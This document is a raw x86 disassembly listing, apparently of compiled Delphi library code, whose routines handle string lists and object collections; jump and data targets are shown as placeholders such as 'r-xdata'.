mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_418d08
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031e0
mov edx esp
mov eax esi
call sub_40426c
add esp 0x100
pop esi
pop ebx
retn
sub_418d30
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_418dc5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_4031e0
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_40426c
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_40348c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_418cf0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d00
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418dcc
lea eax [ ebp - 0x14 ]
call sub_404008
retn
sub_418de8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4192e8
mov edx ebx
mov eax esi
call sub_419280
sub_418e18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_418cf0
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_418404
mov dl 0x1
mov eax ebx
call sub_418ccc
sub_418e48
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_418c00
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_418e94
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_418c00
mov eax [ esi + 0x8 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4188e0
test bl bl
jle r-xdata
mov eax esi
call sub_418fac
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_418ee0
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_418f00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41890c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_418f7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418fac
mov eax esi
call sub_419080
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_419088
push eax
mov eax [ ebp - 0x4 ]
call sub_418ee0
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_418fac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_419006
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_4183f8
call sub_403290
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_419020
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx esi
call sub_418310
cmp ebp [ eax + 0x8 ]
je r-xdata
sub_419060
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419088
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_41909c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41914a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4031e0
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_40426c
mov eax ebx
mov si 0xffff
call sub_40348c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419151
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
mov eax ebx
mov si 0xffff
call sub_40348c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40348c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_419164
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_404388
sub_419164
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_40405c
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_40348c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034b8
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034b8
call sub_41469c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026cc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419261
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034b8
mov edx [ ebp - 0xc ]
call sub_4148a0
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4026ec
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_414924
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_40426c
sub_419280
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40341c
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4181b4
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_418f9c
xor ecx ecx
mov edx esi
mov eax ebx
call sub_418c00
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_41829c
sub_4192e8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_4183f8
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4184ac
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418200
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_418c00
mov eax ebx
call sub_418f9c
pop edi
pop esi
pop ebx
retn
sub_41934c
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_419370
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419f54
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4188e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_4193a0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4193c4
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4193e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41948f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419538
xor eax eax
push ebp
push sub_419472
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419479
mov eax [ ebp - 0x4 ]
call sub_4195f4
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4194a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41890c
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_419538
xor eax eax
push ebp
push sub_419520
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4195f4
retn
sub_419550
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419608
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_4195a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_419dec
mov eax [ ebp - 0x8 ]
push eax
push sub_41a148
push ebp
call sub_419550
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419608
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41969d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196a4
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40402c
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404414
jne r-xdata
sub_4196b4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4196b0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
jmp sub_403a44
sub_4196ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419734
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405d38
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4196b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41973b
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_419744
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41981c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419538
xor eax eax
push ebp
push sub_4197fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419801
mov eax [ ebp - 0x4 ]
call sub_4195f4
retn
sub_419838
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41987d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4044c8
call sub_408844
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419884
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41988c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419997
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4040a0
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_4040f8
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41999e
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40402c
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4042c8
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4042c8
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4042c8
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4042c8
mov ebx eax
test ebx ebx
je r-xdata
sub_4199b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419a33
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_404008
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_404528
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a3a
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_419a40
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419ab8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419abf
lea eax [ ebp - 0xc ]
call sub_404008
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_419acc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419b8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404528
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41a1d8
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_4041f0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c3f4
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b96
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_419ba0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_419bd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_419c04
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ad14
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419c4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c53
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_419c58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419cf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419538
xor eax eax
push ebp
push sub_419cd8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41a860
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_4040f8
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419cdf
mov eax [ ebp - 0x4 ]
call sub_4195f4
retn
sub_419d04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419da5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419dac
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
call sub_419538
xor eax eax
push ebp
push sub_419d88
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4195f4
retn
sub_419db4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_419dec
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419e90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ca50
mov eax [ ebp - 0x4 ]
call sub_419538
xor eax eax
push ebp
push sub_419e6b
push [ fs : eax ]
mov [ fs : eax ] esp
